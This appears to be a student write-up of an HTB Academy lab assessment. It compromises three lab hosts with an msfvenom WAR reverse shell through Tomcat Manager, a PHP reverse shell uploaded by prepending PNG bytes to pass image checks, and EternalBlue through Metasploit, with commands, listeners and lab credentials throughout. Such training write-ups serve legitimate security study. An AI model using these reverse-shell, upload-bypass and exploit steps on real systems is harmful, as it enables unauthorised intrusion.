# Shells & Payloads — Skills Assessment Writeup

**Date:** April 8, 2026  
**Author:** Andrew Mullins  
**Module:** HTB Academy — Shells and Payloads  
**Foothold:** `10.129.204.126` → RDP as `htb-student / HTB_@cademy_stdnt!`

---

## Phase 0: Foothold Setup

```bash
# RDP into the foothold
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!

# Identify internal IP (required for all listeners)
ip addr show | grep 172.16
# Result: 172.16.1.5/23

# Add hostnames to /etc/hosts
echo "172.16.1.12 blog.inlanefreight.local" | sudo tee -a /etc/hosts
echo "172.16.1.11 status.inlanefreight.local" | sudo tee -a /etc/hosts
```

**Key Lesson:** All listeners must bind to `172.16.1.5` — the foothold's internal IP. Targets are on the `172.16.0.0/23` network and cannot reach your VPN IP.

---

## Phase 1: Reconnaissance — All Three Hosts

```bash
nmap -sC -sV 172.16.1.11 -p 8080 -oA host01
nmap -sC -sV blog.inlanefreight.local -p- -oA host02
nmap -sC -sV 172.16.1.13 -p- -oA host03
```

### Scan Results Summary

| Host | Address | OS | Key Services | Attack Vector |
|---|---|---|---|---|
| Host-01 | `172.16.1.11:8080` (status.inlanefreight.local) | **Windows Server 2019** | Apache Tomcat 10.0.11 | WAR file deployment via Tomcat Manager |
| Host-02 | `172.16.1.12` (blog.inlanefreight.local) | **Ubuntu 20.04 LTS** | Apache 2.4.41 (port 80), SSH (22) — "Inlanefreight Gabber" | PHP web shell upload via blog image upload |
| Host-03 | `172.16.1.13` | **Windows Server 2016 Std 14393** | IIS 10.0 (80), SMB (445), WinRM (5985) | MS17-010 (EternalBlue) |

**Key Lesson:** `ping` TTL values give quick OS hints (~128 = Windows, ~64 = Linux), but don't rely on them — Host-01 was Windows running Tomcat, which could easily be mistaken for Linux.

---

## Host-01: Apache Tomcat 10.0.11 (Windows Server 2019)

**Hostname:** `shells-winsvr`  
**IP:** `172.16.1.11:8080`  
**User obtained:** `nt authority\local service`  
**Shell type:** `cmd.exe`  
**Objective:** Windows interactive shell via web application

### Step 1 — Identify the Service

```bash
# Nmap revealed Apache Tomcat 10.0.11 on port 8080
# Browsing http://status.inlanefreight.local:8080 shows the Tomcat default page
# Tomcat Manager is accessible at /manager/html
```

### Step 2 — Access Tomcat Manager

```
URL: http://status.inlanefreight.local:8080/manager/html
Credentials: tomcat / Tomcatadm
```

### Step 3 — Generate WAR Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o shell.war
```

### Step 4 — Deploy and Trigger

```bash
# Start listener
nc -lvnp 4444

# Upload shell.war via Tomcat Manager "WAR file to deploy" section
# Browse to http://status.inlanefreight.local:8080/shell/ to trigger
```

### Step 5 — Enumerate

```cmd
whoami              → nt authority\local service
hostname            → shells-winsvr
systeminfo          → Windows Server 2019 Standard (Build 17763)
dir C:\Shares\      → dev-share
```

### Answer

- **Folder in C:\Shares\:** `dev-share`

### Key Lessons

- Tomcat Manager with weak credentials is a classic WAR deployment vector
- The host was **Windows** despite running Tomcat (typically associated with Linux)
- `java/jsp_shell_reverse_tcp` payload works cross-platform since Java runs on both OS

---

## Host-02: Lightweight Blog (Ubuntu 20.04)

**Hostname:** `shells-nixsvr`  
**IP:** `172.16.1.12`  
**User obtained:** `www-data`  
**Shell type:** `/bin/sh`  
**Objective:** Linux interactive shell via web application exploitation

### Step 1 — Identify the Application

```bash
# Browsing http://blog.inlanefreight.local reveals "Inlanefreight Gabber"
# This is "Lightweight facebook-styled blog 1.3"
# A blog comment from "Slade Wilson" literally links to the exploit:
# https://www.exploit-db.com/exploits/50064
```

### Step 2 — Obtain Credentials

```
Credentials (from the hint/recon): admin / admin123!@#
```

### Step 3 — Prepare PHP Reverse Shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/shell.php
sed -i "s/127.0.0.1/172.16.1.5/" ~/Desktop/shell.php
sed -i "s/1234/4444/" ~/Desktop/shell.php
```

### Step 4 — Upload via curl (Bypassing Image Validation)

The blog's upload only accepts images. It validates actual image content (not just Content-Type headers). The bypass: **prepend real PNG header bytes** to the PHP shell so `getimagesize()` passes, while keeping the `.php` extension so Apache executes it.

```bash
# Get CSRF token and cookies
curl -s -c /tmp/cookies.txt http://blog.inlanefreight.local/ -o /tmp/blog.html
TOKEN=$(cat /tmp/blog.html | grep -oP ':"[a-f0-9]{10}"' | grep -oP '[a-f0-9]{10}' | head -1)
echo "Token: $TOKEN"

# Login (note: # must be URL-encoded as %23, use single quotes to prevent bash expansion)
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -H "Csrf-Token: $TOKEN" -d 'action=login&nick=admin&pass=admin123!@%23' http://blog.inlanefreight.local/ajax.php
# Response: {"logged_in":true,"is_visitor":false}

# Create PNG header + PHP shell combo
echo -n 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAIAAADpgdgBAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAJElEQVQ4' | base64 -d > /tmp/pngheader.bin
cat /tmp/pngheader.bin ~/Desktop/shell.php > ~/Desktop/imgshell.php

# Upload with image/png Content-Type
curl -v -b /tmp/cookies.txt -H "Csrf-Token: $TOKEN" -F "file=@/home/htb-student/Desktop/imgshell.php;type=image/png;filename=shell.php" "http://blog.inlanefreight.local/ajax.php?action=upload_image"
# Response: {"path":"data/i/6tUz.php","thumb":"data/t/6tUz.php"}
```

### Step 5 — Trigger and Catch Shell

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Trigger the shell
curl http://blog.inlanefreight.local/data/i/6tUz.php
```

### Step 6 — Enumerate

```bash
whoami          → www-data
hostname        → shells-nixsvr
cat /etc/os-release → Ubuntu 20.04.3 LTS (Focal Fossa)
find / -name "flag.txt" 2>/dev/null → /customscripts/flag.txt
cat /customscripts/flag.txt
```

### Answers

- **Linux distribution:** `ubuntu`
- **Shell language (50064.rb exploit):** `php`

### Key Lessons

- **Image validation bypass:** When the server checks actual image content (not just headers), prepend valid image bytes before the payload
- **Bash special characters:** `!` and `#` cause issues in bash — URL-encode `#` as `%23` and use single quotes
- The Metasploit module (`50064.rb`) failed on automated upload, but the **manual curl approach** worked — always have a manual fallback
- The exploit technique: PNG header bytes → `getimagesize()` passes → `.php` extension → Apache executes the PHP code after the binary header

---

## Host-03: Windows Server 2016 — EternalBlue (MS17-010)

**Hostname:** `SHELLS-WINBLUE`  
**IP:** `172.16.1.13`  
**User obtained:** `NT AUTHORITY\SYSTEM` (via Meterpreter)  
**Shell type:** Meterpreter → cmd.exe  
**Objective:** Windows interactive shell via SMB exploit

### Step 1 — Identify Vulnerability

```bash
# Nmap showed:
# - Windows Server 2016 Standard 14393
# - SMB (445) open, message signing DISABLED
# - Computer name: SHELLS-WINBLUE

# Verify MS17-010 vulnerability
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.13
run
# Result: [+] Host is likely VULNERABLE to MS17-010!
```

### Step 2 — Exploit

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.13
set LHOST 172.16.1.5
set LPORT 4445
run
```

**Note:** Port 443 failed with "Permission denied — bind(2)" because binding to ports below 1024 requires root. Use a high port like `4445`.

### Step 3 — Get Flag

```cmd
# From Meterpreter:
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

### Answers

- **Hostname:** `SHELLS-WINBLUE`
- **Flag:** contents of `C:\Users\Administrator\Desktop\Skills-flag.txt`

### Key Lessons

- **EternalBlue (MS17-010)** is devastating against unpatched Windows Server 2016 — gives instant SYSTEM access
- **Port binding:** Ports < 1024 require root/sudo. Always use high ports (4444, 4445, 8443) unless running as root
- **SMB signing disabled** is a key indicator during nmap recon
- Always **verify** with the auxiliary scanner before running the exploit

---

## Challenge Questions Summary

| # | Question | Answer | Host |
|---|---|---|---|
| 1 | Folder in C:\Shares\ | `dev-share` | Host-01 |
| 2 | Linux distribution on Host-2 | `ubuntu` | Host-02 |
| 3 | Shell language from 50064.rb | `php` | Host-02 |
| 4 | Hostname of Host-3 | `SHELLS-WINBLUE` | Host-03 |
| 5 | Flag from Host-3 Administrator Desktop | (your flag) | Host-03 |

---

## Attack Flow Diagram

```
FOOTHOLD (172.16.1.5 - Parrot Linux)
│
├─── Host-01 (172.16.1.11:8080) ── Tomcat Manager ── WAR Upload ── cmd.exe shell
│    Creds: tomcat / Tomcatadm
│    Tool: msfvenom (java/jsp_shell_reverse_tcp) + nc listener
│
├─── Host-02 (172.16.1.12:80) ── Blog Login ── Image Upload Bypass ── /bin/sh shell
│    Creds: admin / admin123!@#
│    Tool: curl + PNG header prepend + nc listener
│    Bypass: Prepend valid PNG bytes to PHP shell to pass getimagesize()
│
└─── Host-03 (172.16.1.13:445) ── EternalBlue (MS17-010) ── SYSTEM shell
     Creds: None needed
     Tool: Metasploit ms17_010_psexec
```

---

## Methodological Takeaways

1. **Always scan all targets first** before attacking — understanding the full scope prevents tunnel vision
2. **Note hostnames from nmap** — they often answer challenge questions directly (`SHELLS-WINBLUE`)
3. **Don't assume OS from services** — Tomcat doesn't mean Linux (Host-01 was Windows)
4. **Read the application itself** — blog comments literally contained exploit hints
5. **Have a manual fallback** — when Metasploit modules fail (Host-02), manual curl/browser methods work
6. **Watch special characters in bash** — URL-encode and use single quotes for passwords with `!@#`
7. **Use high ports for listeners** — binding below 1024 requires root privileges
8. **Listener IP matters** — always use your foothold's internal IP, not VPN IP
